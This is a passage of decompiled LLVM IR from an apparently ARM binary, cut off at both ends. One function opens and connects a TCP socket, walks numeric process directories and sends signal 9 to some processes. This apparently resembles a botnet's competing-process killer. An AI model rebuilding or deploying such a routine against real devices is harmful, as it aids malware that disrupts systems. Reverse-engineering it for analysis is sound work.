  %v0_d1d0.pr71 = phi i32 [ 0, %dec_label_pc_d50c ], [ %v0_d1d0.pr72, %dec_label_pc_d1dc ]
  %v0_d1b0 = add i32 %v0_d1e0, 1
  %v1_d1b0 = add i32 %v0_d1e0, 3
  %v2_d1b0 = inttoptr i32 %v1_d1b0 to i8*
  %v3_d1b0 = load i8, i8* %v2_d1b0, align 1
  %v2_d1b4 = icmp eq i8 %v3_d1b0, 0
  %v1_d1b8 = add i32 %v0_d1b879, 1
  br i1 %v2_d1b4, label %dec_label_pc_d1e8, label %dec_label_pc_d1c0

dec_label_pc_d518:                                ; preds = %dec_label_pc_d500
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_d50c

dec_label_pc_d520:                                ; preds = %dec_label_pc_cfe8
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_d094

; uselistorder directives
  uselistorder i32 %v1_d1b8, { 1, 0 }
  uselistorder i8 %v3_d1b0, { 1, 0 }
  uselistorder i32 %v0_d1e882, { 1, 0 }
  uselistorder i32 %v1_d4f4, { 1, 0 }
  uselistorder i32 %v2_d4a8, { 1, 0 }
  uselistorder i32 %v1_d214, { 1, 0 }
  uselistorder i32 %v0_d22030, { 1, 0 }
  uselistorder i32 %v1_d238, { 0, 3, 1, 2 }
  uselistorder i32 %v0_d1dc, { 1, 0 }
  uselistorder i32 %v0_d1b879, { 1, 0 }
  uselistorder i32 %v0_d4f4, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_d1e884, { 1, 2, 0 }
  uselistorder i32 %v1_d1b855, { 1, 0 }
  uselistorder i32 %v2_d19c, { 1, 0 }
  uselistorder i32 %v1_d198, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_d158, { 0, 2, 1 }
  uselistorder i32 %v0_d15816, { 1, 0 }
  uselistorder i32 %v1_d124, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v3_d0b4, { 1, 2, 0 }
  uselistorder i32 %v0_d06c, { 1, 0 }
  uselistorder i32 %v2_d068, { 1, 0, 2 }
  uselistorder i8* %v2_d050, { 1, 0, 2 }
  uselistorder i32 %v2_d030, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32)* @function_fa60, { 0, 1, 4, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @function_fb9c, { 1, 0 }
  uselistorder label %dec_label_pc_d50c, { 1, 0 }
  uselistorder label %dec_label_pc_d4e0, { 1, 0 }
  uselistorder label %dec_label_pc_d4cc, { 1, 0 }
  uselistorder label %dec_label_pc_d4c0, { 1, 0 }
  uselistorder label %dec_label_pc_d4b4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_d49c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_d3ac, { 1, 0 }
  uselistorder label %dec_label_pc_d3acthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_d394.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_d2b0, { 1, 0 }
  uselistorder label %dec_label_pc_d2b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_d2a0.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d234, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d1dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d1c0, { 1, 0 }
  uselistorder label %dec_label_pc_d164, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_d0c8.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_d118, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_d0e0, { 1, 0 }
  uselistorder label %dec_label_pc_d094, { 1, 0 }
}

define i32 @function_d550(i32 %arg1) local_unnamed_addr {
dec_label_pc_d550:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8412 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %v6_d550 = load i32, i32* @r5, align 4
  %v9_d550 = load i32, i32* @r6, align 4
  %v2_d560 = call i32 @function_10254(i32* null)
  store i32 %v2_d560, i32* @r0, align 4
  store i32 %v2_d560, i32* @r7, align 4
  %v0_d568 = call i32 @function_102c4()
  %v7_d56c = icmp eq i32 %v0_d568, -1
  %. = zext i1 %v7_d56c to i32
  %tmp220 = icmp slt i32 %v0_d568, 1
  %storemerge184 = select i1 %tmp220, i32 %., i32 1
  store i32 %storemerge184, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_20608.85 to i32), i32* %r3.global-to-local, align 4
  %v2_d588 = icmp eq i32 %storemerge184, 0
  store i32 %v0_d568, i32* @global_var_20608.85, align 4
  br i1 %v2_d588, label %dec_label_pc_d5a4, label %dec_label_pc_d594

dec_label_pc_d594:                                ; preds = %dec_label_pc_d71c, %dec_label_pc_d600, %dec_label_pc_d550
  %v1_d5a0 = phi i32 [ %v2_d6b8, %dec_label_pc_d600 ], [ %v0_d568, %dec_label_pc_d550 ], [ 0, %dec_label_pc_d71c ]
  store i32 %v6_d550, i32* @r5, align 4
  store i32 %v9_d550, i32* @r6, align 4
  ret i32 %v1_d5a0

dec_label_pc_d5a4:                                ; preds = %dec_label_pc_d550
  %v2_d5a4 = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_d5a4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  %v1_d5b8 = call i32 @function_cfe8(i32 5888)
  store i32 %v2_d5a4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d5cc = load i32, i32* @r5, align 4
  store i32 %v0_d5cc, i32* %r2.global-to-local, align 4
  %v3_d5d4 = call i32 @function_10df0(i32 2, i32 1, i32 %v0_d5cc)
  %v7_d5d8 = icmp eq i32 %v3_d5d4, -1
  store i32 %v3_d5d4, i32* @r4, align 4
  br i1 %v7_d5d8, label %dec_label_pc_d600, label %dec_label_pc_d5e4

dec_label_pc_d5e4:                                ; preds = %dec_label_pc_d5a4
  %v2_d5e8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_d5e8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d5f0 = call i32 @function_10ba0(i32 %v3_d5d4, i32 %v2_d5e8, i32 16)
  %v0_d5f4 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d5fc = call i32 @function_10c8c(i32 %v0_d5f4, i32 1)
  br label %dec_label_pc_d600

dec_label_pc_d600:                                ; preds = %dec_label_pc_d5a4, %dec_label_pc_d5e4
  %v1_d604 = call i32 @function_126fc(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_d60c = call i32 @function_11038()
  store i32 ptrtoint (i32* @global_var_1e5b8.87 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20604.89 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_d60c, i32* %r2.global-to-local, align 4
  %v0_d61c = load i32, i32* @r5, align 4
  %v1_d61c = trunc i32 %v0_d61c to i8
  %v3_d61c = inttoptr i32 %v0_d60c to i8*
  store i8 %v1_d61c, i8* %v3_d61c, align 1
  %v0_d624 = load i32, i32* @r5, align 4
  %v1_d624 = load i32, i32* %r3.global-to-local, align 4
  %v2_d624 = inttoptr i32 %v1_d624 to i32*
  store i32 %v0_d624, i32* %v2_d624, align 4
  %v0_d628 = load i32, i32* %r2.global-to-local, align 4
  %v1_d628 = load i32, i32* %r1.global-to-local, align 4
  %v2_d628 = inttoptr i32 %v1_d628 to i32*
  store i32 %v0_d628, i32* %v2_d628, align 4
  %v1_d62c = call i32 @function_f0ac(i32 6)
  %v1_d634 = call i32 @function_f0ac(i32 7)
  %v2_d63c = ptrtoint i32* %stack_var_-4264 to i32
  store i32 %v2_d63c, i32* %r2.global-to-local, align 4
  %v0_d640 = load i32, i32* @r5, align 4
  store i32 %v0_d640, i32* %r1.global-to-local, align 4
  %v2_d64c = inttoptr i32 %v0_d640 to i32*
  %v3_d64c = call i32 @function_efe8(i32 6, i32* %v2_d64c)
  %v1_d654 = add i32 %v2_d63c, -52
  store i32 %v1_d654, i32* %r3.global-to-local, align 4
  store i32 %v3_d64c, i32* %r1.global-to-local, align 4
  store i32 %v1_d654, i32* @r0, align 4
  %v2_d664 = inttoptr i32 %v1_d654 to i8*
  %v3_d664 = call i32 @function_f964(i8* %v2_d664, i32 %v3_d64c)
  store i32 %v3_d664, i32* @r0, align 4
  %v2_d66c = add i32 %v3_d664, %v1_d654
  store i32 %v2_d66c, i32* @r4, align 4
  %v0_d670 = call i32 @function_10240()
  %v2_d678 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_d678, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_d680 = trunc i32 %v0_d670 to i8
  %v4_d680 = call i32 @function_fe30(i8 %v3_d680, i32 10, i32 %v2_d678)
  store i32 %v4_d680, i32* %r1.global-to-local, align 4
  %v0_d688 = load i32, i32* @r4, align 4
  store i32 %v0_d688, i32* @r0, align 4
  %v2_d68c = inttoptr i32 %v0_d688 to i8*
  %v3_d68c = call i32 @function_f964(i8* %v2_d68c, i32 %v4_d680)
  %v0_d690 = load i32, i32* @r5, align 4
  store i32 %v0_d690, i32* %r1.global-to-local, align 4
  %v1_d694 = load i32, i32* @r4, align 4
  %v2_d694 = add i32 %v1_d694, %v3_d68c
  store i32 %v2_d694, i32* @r4, align 4
  %v2_d69c = inttoptr i32 %v0_d690 to i32*
  %v3_d69c = call i32 @function_efe8(i32 7, i32* %v2_d69c)
  store i32 %v3_d69c, i32* %r1.global-to-local, align 4
  %v0_d6a4 = load i32, i32* @r4, align 4
  store i32 %v0_d6a4, i32* @r0, align 4
  %v2_d6a8 = inttoptr i32 %v0_d6a4 to i8*
  %v3_d6a8 = call i32 @function_f964(i8* %v2_d6a8, i32 %v3_d69c)
  %v0_d6ac = load i32, i32* @r5, align 4
  store i32 %v0_d6ac, i32* %r1.global-to-local, align 4
  store i32 %v3_d6a8, i32* @r6, align 4
  %v2_d6b8 = call i32 @function_101e0(i32 %v1_d654, i32 %v0_d6ac)
  %v7_d6bc = icmp eq i32 %v2_d6b8, -1
  br i1 %v7_d6bc, label %dec_label_pc_d594, label %dec_label_pc_d6c4

dec_label_pc_d6c4:                                ; preds = %dec_label_pc_d600
  %v1_d6c4 = call i32 @function_10608(i32 %v2_d6b8)
  %v1_d6cc = call i32 @function_f00c(i32 6)
  %v1_d6d4 = call i32 @function_f00c(i32 7)
  store i32 ptrtoint (i32* @global_var_20604.89 to i32), i32* %r3.global-to-local, align 4
  %v2_d6e0 = load i32, i32* @global_var_20604.89, align 4
  store i32 %v2_d6e0, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d6ec = call i32 @function_1036c(i32 %v1_d654, i32 %v2_d6e0, i32 4095)
  %v7_d6f0 = icmp eq i32 %v3_d6ec, -1
  br i1 %v7_d6f0, label %.thread9, label %bb223

bb223:                                            ; preds = %dec_label_pc_d6c4
  %v3_d6f8 = load i32, i32* @global_var_20604.89, align 4
  store i32 %v3_d6f8, i32* %r3.global-to-local, align 4
  %v1_d6fc = load i32, i32* @r5, align 4
  %v2_d6fc = trunc i32 %v1_d6fc to i8
  %v5_d6fc = add i32 %v3_d6f8, %v3_d6ec
  %v6_d6fc = inttoptr i32 %v5_d6fc to i8*
  store i8 %v2_d6fc, i8* %v6_d6fc, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d6c4, %bb223
  %v0_d704 = load i32, i32* @r6, align 4
  %v1_d704 = load i32, i32* @r4, align 4
  %v1_d654.neg = sub i32 52, %v2_d63c
  %v2_d704 = add i32 %v1_d654.neg, %v0_d704
  %v2_d708 = add i32 %v2_d704, %v1_d704
  store i32 %v2_d708, i32* %r1.global-to-local, align 4
  %v2_d70c = call i32 @function_f9d0(i32 %v1_d654, i32 %v2_d708)
  %v0_d710 = load i32, i32* @r7, align 4
  store i32 %v0_d710, i32* @r4, align 4
  %v0_d714 = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_d820 = ptrtoint i32* %stack_var_-156 to i32
  %v2_d824 = bitcast i32* %stack_var_-156 to i8*
  %v2_d870 = ptrtoint i32* %stack_var_-220 to i32
  %v2_d874 = bitcast i32* %stack_var_-220 to i8*
  %v2_d9e0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d9f0 = ptrtoint i32* %stack_var_-48 to i32
  %v2_da04 = ptrtoint i32* %stack_var_-52 to i32
  %v2_da14 = ptrtoint i32* %stack_var_-56 to i32
  %v2_da2c = ptrtoint i32* %stack_var_-60 to i32
  %v2_da40 = ptrtoint i32* %stack_var_-8412 to i32
  br label %dec_label_pc_d71c

dec_label_pc_d71c:                                ; preds = %dec_label_pc_d7e4, %.thread9
  %stack_var_-8428.0 = phi i32 [ %v0_d714, %.thread9 ], [ %stack_var_-8428.3, %dec_label_pc_d7e4 ]
  %v1_d720 = call i32 @function_f0ac(i32 6)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d72c = call i32 @function_efe8(i32 6, i32* null)
  %v1_d730 = call i32 @function_10804(i32 %v3_d72c)
  store i32 %v1_d730, i32* @r8, align 4
  %v2_d734 = icmp eq i32 %v1_d730, 0
  br i1 %v2_d734, label %dec_label_pc_d594, label %dec_label_pc_d73c

dec_label_pc_d73c:                                ; preds = %dec_label_pc_d71c
  %v1_d740 = call i32 @function_f00c(i32 6)
  %v0_d744119 = load i32, i32* @r8, align 4
  %v1_d748120 = inttoptr i32 %v0_d744119 to i32*
  %v2_d748121 = call i32 @function_10948(i32* %v1_d748120)
  %v2_d74c123 = icmp eq i32 %v2_d748121, 0
  br i1 %v2_d74c123, label %dec_label_pc_d7e4, label %dec_label_pc_d754.preheader

dec_label_pc_d754.preheader:                      ; preds = %dec_label_pc_d73c, %dec_label_pc_d744.backedge
  %v0_d754134 = phi i32 [ %v2_d748, %dec_label_pc_d744.backedge ], [ %v2_d748121, %dec_label_pc_d73c ]
  %stack_var_-8428.1124 = phi i32 [ %stack_var_-8428.1.be, %dec_label_pc_d744.backedge ], [ %stack_var_-8428.0, %dec_label_pc_d73c ]
  br label %dec_label_pc_d754

dec_label_pc_d754:                                ; preds = %dec_label_pc_d754.preheader, %dec_label_pc_d7cc
  %v0_d764 = phi i32 [ %v2_d7d8, %dec_label_pc_d7cc ], [ %v0_d754134, %dec_label_pc_d754.preheader ]
  %stack_var_-8428.2 = phi i32 [ %v1_d778, %dec_label_pc_d7cc ], [ %stack_var_-8428.1124, %dec_label_pc_d754.preheader ]
  %v1_d754 = add i32 %v0_d764, 11
  %v2_d754 = inttoptr i32 %v1_d754 to i8*
  %v3_d754 = load i8, i8* %v2_d754, align 1
  %v4_d754 = zext i8 %v3_d754 to i32
  %v1_d758 = add nsw i32 %v4_d754, -48
  store i32 %v1_d758, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d758, 9
  br i1 %tmp, label %dec_label_pc_d744.backedge, label %dec_label_pc_d764

dec_label_pc_d764:                                ; preds = %dec_label_pc_d754
  store i32 %v1_d754, i32* @r6, align 4
  store i32 %v1_d754, i32* @r0, align 4
  %v1_d76c = call i32 @function_12448(i32 %v1_d754)
  %v0_d774 = load i32, i32* @r5, align 4
  %v1_d778 = add i32 %stack_var_-8428.2, 1
  store i32 %v1_d778, i32* %r1.global-to-local, align 4
  store i32 %v1_d76c, i32* @r7, align 4
  %v5_d784 = icmp slt i32 %v0_d774, %v1_d76c
  %v2_d7f4 = call i32 @function_10254(i32* null)
  br i1 %v5_d784, label %dec_label_pc_d7f0, label %dec_label_pc_d788

dec_label_pc_d788:                                ; preds = %dec_label_pc_d764
  %v0_d790 = load i32, i32* @r4, align 4
  %v2_d790 = sub i32 %v2_d7f4, %v0_d790
  %v7_d798 = icmp slt i32 %v2_d790, 601
  br i1 %v7_d798, label %dec_label_pc_d7a0, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d788
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_d744.backedge

dec_label_pc_d7a0:                                ; preds = %dec_label_pc_d788
  %v0_d7a0 = load i32, i32* @r7, align 4
  %v7_d7a4 = icmp slt i32 %v0_d7a0, 401
  br i1 %v7_d7a4, label %dec_label_pc_d744.backedge, label %dec_label_pc_d7a8

dec_label_pc_d7a8:                                ; preds = %dec_label_pc_d7a0
  %v3_d7b0 = zext i32 %v1_d778 to i64
  %v4_d7b0 = mul nuw i64 %v3_d7b0, 3435973837
  %v3_d7b41 = udiv i64 %v4_d7b0, 34359738368
  %v3_d7b83 = mul nuw nsw i64 %v3_d7b41, 8
  %v3_d7b8 = trunc i64 %v3_d7b83 to i32
  store i32 %v3_d7b8, i32* %r3.global-to-local, align 4
  %v2_d7bc5 = mul nuw nsw i64 %v3_d7b41, 2
  %v2_d7bc = trunc i64 %v2_d7bc5 to i32
  %v2_d7c0 = add i32 %v3_d7b8, %v2_d7bc
  store i32 %v2_d7c0, i32* %r2.global-to-local, align 4
  %v9_d7c4 = icmp eq i32 %v1_d778, %v2_d7c0
  br i1 %v9_d7c4, label %dec_label_pc_d7cc, label %dec_label_pc_d744.backedge

dec_label_pc_d7cc:                                ; preds = %dec_label_pc_d7a8
  %v1_d7d0 = call i32 @function_126fc(i32 1)
  %v0_d7d4 = load i32, i32* @r8, align 4
  %v1_d7d8 = inttoptr i32 %v0_d7d4 to i32*
  %v2_d7d8 = call i32 @function_10948(i32* %v1_d7d8)
  %v2_d7dc = icmp eq i32 %v2_d7d8, 0
  br i1 %v2_d7dc, label %dec_label_pc_d7e4, label %dec_label_pc_d754

dec_label_pc_d7e4:                                ; preds = %dec_label_pc_d744.backedge, %dec_label_pc_d7cc, %dec_label_pc_d73c
  %stack_var_-8428.3 = phi i32 [ %stack_var_-8428.0, %dec_label_pc_d73c ], [ %v1_d778, %dec_label_pc_d7cc ], [ %stack_var_-8428.1.be, %dec_label_pc_d744.backedge ]
  %v0_d7e4 = load i32, i32* @r8, align 4
  %v1_d7e8 = inttoptr i32 %v0_d7e4 to i32*
  %v2_d7e8 = call i32 @function_1063c(i32* %v1_d7e8)
  br label %dec_label_pc_d71c

dec_label_pc_d7f0:                                ; preds = %dec_label_pc_d764
  %v1_d800 = call i32 @function_f0ac(i32 6)
  %v1_d808 = call i32 @function_f0ac(i32 7)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d814 = call i32 @function_efe8(i32 6, i32* null)
  store i32 %v3_d814, i32* %r1.global-to-local, align 4
  store i32 %v2_d820, i32* @r0, align 4
  %v3_d824 = call i32 @function_f964(i8* %v2_d824, i32 %v3_d814)
  %v2_d830 = add i32 %v3_d824, %v2_d820
  store i32 %v2_d830, i32* %r5.global-to-local, align 4
  store i32 %v2_d830, i32* @r0, align 4
  %v0_d838 = load i32, i32* @r6, align 4
  store i32 %v0_d838, i32* %r1.global-to-local, align 4
  %v2_d83c = inttoptr i32 %v2_d830 to i8*
  %v3_d83c = call i32 @function_f964(i8* %v2_d83c, i32 %v0_d838)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d84c = call i32 @function_efe8(i32 7, i32* null)
  store i32 %v3_d84c, i32* %r1.global-to-local, align 4
  %v1_d854 = load i32, i32* %r5.global-to-local, align 4
  %v2_d854 = add i32 %v1_d854, %v3_d83c
  store i32 %v2_d854, i32* @r0, align 4
  %v2_d858 = inttoptr i32 %v2_d854 to i8*
  %v3_d858 = call i32 @function_f964(i8* %v2_d858, i32 %v3_d84c)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d864 = call i32 @function_efe8(i32 6, i32* null)
  store i32 %v3_d864, i32* %r1.global-to-local, align 4
  store i32 %v2_d870, i32* @r0, align 4
  %v3_d874 = call i32 @function_f964(i8* %v2_d874, i32 %v3_d864)
  store i32 %v2_d870, i32* %r2.global-to-local, align 4
  %v2_d880 = add i32 %v3_d874, %v2_d870
  store i32 %v2_d880, i32* @r5, align 4
  %v0_d884 = load i32, i32* @r6, align 4
  store i32 %v0_d884, i32* %r1.global-to-local, align 4
  store i32 %v2_d880, i32* @r0, align 4
  %v2_d88c = inttoptr i32 %v2_d880 to i8*
  %v3_d88c = call i32 @function_f964(i8* %v2_d88c, i32 %v0_d884)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d88c, i32* @r4, align 4
  %v3_d89c = call i32 @function_efe8(i32 11, i32* null)
  store i32 %v3_d89c, i32* %r1.global-to-local, align 4
  %v0_d8a4 = load i32, i32* @r4, align 4
  %v1_d8a4 = load i32, i32* @r5, align 4
  %v2_d8a4 = add i32 %v1_d8a4, %v0_d8a4
  store i32 %v2_d8a4, i32* @r0, align 4
  %v2_d8a8 = inttoptr i32 %v2_d8a4 to i8*
  %v3_d8a8 = call i32 @function_f964(i8* %v2_d8a8, i32 %v3_d89c)
  %v1_d8b0 = call i32 @function_f00c(i32 6)
  %v1_d8b8 = call i32 @function_f00c(i32 7)
  store i32 %v1_d654, i32* %r1.global-to-local, align 4
  store i32 4095, i32* @r2, align 4
  %v3_d8d0 = call i32 @function_1036c(i32 %v2_d820, i32 %v1_d654, i32 4095)
  %v7_d8d4 = icmp eq i32 %v3_d8d0, -1
  store i32 %v3_d8d0, i32* @r5, align 4
  br i1 %v7_d8d4, label %dec_label_pc_d998, label %dec_label_pc_d8e0

dec_label_pc_d8e0:                                ; preds = %dec_label_pc_d7f0
  store i32 %v1_d654, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d8e8 = add i32 %v3_d8d0, %v1_d654
  %v5_d8e8 = inttoptr i32 %v4_d8e8 to i8*
  store i8 0, i8* %v5_d8e8, align 1
  %v1_d8f0 = call i32 @function_f0ac(i32 10)
  %v0_d8f4 = load i32, i32* @r4, align 4
  store i32 %v0_d8f4, i32* %r1.global-to-local, align 4
  %v2_d8fc = inttoptr i32 %v0_d8f4 to i32*
  %v3_d8fc = call i32 @function_efe8(i32 10, i32* %v2_d8fc)
  %v0_d900 = load i32, i32* @r5, align 4
  %v1_d900 = add i32 %v0_d900, -1
  store i32 %v1_d900, i32* @r1, align 4
  store i32 %v3_d8fc, i32* %r2.global-to-local, align 4
  %v4_d90c = call i32 @function_fc8c(i8* %v2_d664, i32 %v1_d900, i32 %v3_d8fc)
  %v7_d910 = icmp eq i32 %v4_d90c, -1
  br i1 %v7_d910, label %dec_label_pc_d92c, label %dec_label_pc_d918

dec_label_pc_d918:                                ; preds = %dec_label_pc_d8e0
  %v1_d91c = call i32 @function_101ac(i32 %v1_d654)
  %v0_d920 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d928 = call i32 @function_103d4(i32 %v0_d920, i32 9)
  br label %dec_label_pc_d92c

dec_label_pc_d92c:                                ; preds = %dec_label_pc_d8e0, %dec_label_pc_d918
  %v1_d930 = call i32 @function_f00c(i32 10)
  store i32 %v1_d930, i32* @r0, align 4
  %v0_d934 = call i32 @function_10240()
  store i32 %v0_d934, i32* @r0, align 4
  %v1_d938 = load i32, i32* @r7, align 4
  %v9_d938 = icmp eq i32 %v0_d934, %v1_d938
  br i1 %v9_d938, label %dec_label_pc_d964, label %dec_label_pc_d940

dec_label_pc_d940:                                ; preds = %dec_label_pc_d92c
  %v0_d940 = call i32 @function_10198()
  %v1_d944 = load i32, i32* @r7, align 4
  %v9_d944 = icmp eq i32 %v0_d940, %v1_d944
  br i1 %v9_d944, label %dec_label_pc_d964, label %dec_label_pc_d94c

dec_label_pc_d94c:                                ; preds = %dec_label_pc_d940
  %v2_d954 = load i32, i32* @global_var_20604.89, align 4
  store i32 %v2_d954, i32* %r1.global-to-local, align 4
  %v3_d958 = call i32 @function_fd1c(i8* %v2_d664, i32 %v2_d954)
  %v2_d95c = icmp eq i32 %v3_d958, 0
  br i1 %v2_d95c, label %dec_label_pc_d970, label %dec_label_pc_d94c.dec_label_pc_d964_crit_edge

dec_label_pc_d94c.dec_label_pc_d964_crit_edge:    ; preds = %dec_label_pc_d94c
  %v0_d968.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d964

dec_label_pc_d964:                                ; preds = %dec_label_pc_d94c.dec_label_pc_d964_crit_edge, %dec_label_pc_d940, %dec_label_pc_d92c
  %v0_d968 = phi i32 [ %v0_d968.pre, %dec_label_pc_d94c.dec_label_pc_d964_crit_edge ], [ %v0_d940, %dec_label_pc_d940 ], [ %v0_d934, %dec_label_pc_d92c ]
  store i32 %v2_d7f4, i32* @r4, align 4
  store i32 %v0_d968, i32* @r5, align 4
  br label %dec_label_pc_d744.backedge

dec_label_pc_d744.backedge:                       ; preds = %dec_label_pc_d7a8, %dec_label_pc_d7a0, %dec_label_pc_d754, %dec_label_pc_d964, %dec_label_pc_dc24, %.thread10
  %stack_var_-8428.1.be = phi i32 [ %v1_d778, %dec_label_pc_dc24 ], [ %v1_d778, %dec_label_pc_d964 ], [ %v1_d778, %.thread10 ], [ %stack_var_-8428.2, %dec_label_pc_d754 ], [ %v1_d778, %dec_label_pc_d7a0 ], [ %v1_d778, %dec_label_pc_d7a8 ]
  %v0_d744 = load i32, i32* @r8, align 4
  %v1_d748 = inttoptr i32 %v0_d744 to i32*
  %v2_d748 = call i32 @function_10948(i32* %v1_d748)
  %v2_d74c = icmp eq i32 %v2_d748, 0
  br i1 %v2_d74c, label %dec_label_pc_d7e4, label %dec_label_pc_d754.preheader

dec_label_pc_d970:                                ; preds = %dec_label_pc_d94c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d978 = call i32 @function_101e0(i32 %v1_d654, i32 0)
  %v7_d97c = icmp eq i32 %v2_d978, -1
  store i32 %v2_d978, i32* @r4, align 4
  br i1 %v7_d97c, label %bb224, label %.thread12

bb224:                                            ; preds = %dec_label_pc_d970
  store i32 9, i32* %r1.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d970, %bb224
  store i32 55696, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d97c, i32 ptrtoint (i32* @global_var_103d4.91 to i32))
  %v0_d990 = load i32, i32* @r4, align 4
  %v1_d994 = call i32 @function_10608(i32 %v0_d990)
  br label %dec_label_pc_d998

dec_label_pc_d998:                                ; preds = %dec_label_pc_d7f0, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d9a4 = call i32 @function_101e0(i32 %v2_d820, i32 0)
  %v7_d9a8 = icmp eq i32 %v2_d9a4, -1
  br i1 %v7_d9a8, label %dec_label_pc_dc24, label %dec_label_pc_d9b4

dec_label_pc_d9b4:                                ; preds = %dec_label_pc_d998
  %v1_d9b8 = call i32 @function_f0ac(i32 12)
  %v1_d9c0 = call i32 @function_f0ac(i32 13)
  %v1_d9c8 = call i32 @function_f0ac(i32 14)
  %v1_d9d0 = call i32 @function_f0ac(i32 15)
  %v1_d9d8 = call i32 @function_f0ac(i32 16)
  store i32 %v2_d9e0, i32* %r1.global-to-local, align 4
  %v3_d9e8 = call i32 @function_efe8(i32 12, i32* nonnull %stack_var_-44)
  store i32 %v2_d9f0, i32* %r1.global-to-local, align 4
  store i32 %v3_d9e8, i32* @r6, align 4
  %v3_d9fc = call i32 @function_efe8(i32 13, i32* nonnull %stack_var_-48)
  store i32 %v2_da04, i32* %r1.global-to-local, align 4
  store i32 %v3_d9fc, i32* @sl, align 4
  %v3_da10 = call i32 @function_efe8(i32 14, i32* nonnull %stack_var_-52)
  store i32 %v2_da14, i32* %r1.global-to-local, align 4
  store i32 %v3_da10, i32* @sb, align 4
  %v3_da20 = call i32 @function_efe8(i32 15, i32* nonnull %stack_var_-56)
  store i32 %v3_da20, i32* @fp, align 4
  store i32 %v2_da2c, i32* %r1.global-to-local, align 4
  %v3_da34 = call i32 @function_efe8(i32 16, i32* nonnull %stack_var_-60)
  store i32 %v2_da40, i32* @r4, align 4
  store i32 %v2_da40, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v1_da50116 = call i32 @function_103a0(i32 %v2_d9a4)
  %tmp225 = icmp slt i32 %v1_da50116, 1
  br i1 %tmp225, label %dec_label_pc_dc58, label %dec_label_pc_da5c

dec_label_pc_da5c:                                ; preds = %dec_label_pc_d9b4, %dec_label_pc_da44.backedge
  %v0_dae4107 = phi i32 [ %v1_da50, %dec_label_pc_da44.backedge ], [ %v1_da50116, %dec_label_pc_d9b4 ]
  store i32 %v2_d5a4, i32* %r1.global-to-local, align 4
  %v3_da60 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_da60, i32* @r5, align 4
  %v5_da68 = icmp slt i32 %v0_dae4107, %v3_da60
  br i1 %v5_da68, label %dec_label_pc_da78, label %dec_label_pc_db24.lr.ph

dec_label_pc_db24.lr.ph:                          ; preds = %dec_label_pc_da5c
  %v1_db1c72 = add i32 %v0_dae4107, -1
  store i32 %v1_db1c72, i32* %r1.global-to-local, align 4
  %v0_db24.pre = load i32, i32* @r6, align 4
